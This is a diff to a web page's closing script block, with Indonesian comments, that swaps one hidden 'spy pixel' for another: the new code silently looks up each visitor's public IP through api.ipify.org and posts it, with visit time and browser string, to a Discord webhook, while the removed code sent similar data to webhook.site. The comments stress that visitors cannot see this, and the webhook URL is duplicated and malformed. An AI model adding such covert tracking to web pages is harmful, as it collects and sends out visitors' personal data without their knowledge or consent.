@@ -146,16 +146,30 @@
         };
     </script>
     <!-- KODE SPY PIXEL -->
+       <!-- KODE SPY PIXEL VERSI DISCORD -->
     <script>
-        // Ganti URL di bawah dengan URL dari Webhook.site atau Discord kamu
-        const WEBHOOK_URL = "https://webhook.site/b0f63504-aeb4-4fa7-a120-e80bf5d29dab"; 
+        // GANTI DENGAN LINK WEBHOOK DISCORD KAMU
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/https://discord.com/api/webhooks/1575861813231226900/ox08MnNlPkNi713PwMsxeyhdQLhhtl2Mfq_C1LJFPdaDipyJdCACrHSkzXUIKrfx9LGI";
 
-        const img = new Image();
-        const time = encodeURIComponent(new Date().toLocaleString('id-ID'));
-        const ua = encodeURIComponent(navigator.userAgent);
-        
-        // Mengirim data secara diam-diam (tidak terlihat oleh pengunjung)
-        img.src = WEBHOOK_URL + "?status=MENGINTIP&jam=" + time + "&browser=" + ua;
+        const time = new Date().toLocaleString('id-ID');
+        const ua = navigator.userAgent;
+
+        // Fungsi untuk mengirim pesan ke Discord
+        function kirimLaporan(ip) {
+            fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: `🚨 **MENGINTIP TERDETEKSI!** 🚨\n\n⏰ **Waktu:** ${time}\n🌐 **IP Address:** ${ip}\n💻 **Browser:** ${ua}`
+                })
+            }).catch(() => {});
+        }
+
+        // Ambil IP publik pengunjung secara diam-diam, lalu kirim
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => kirimLaporan(data.ip))
+            .catch(() => kirimLaporan("Gagal mendeteksi IP"));
     </script>
 </body>
 </html>
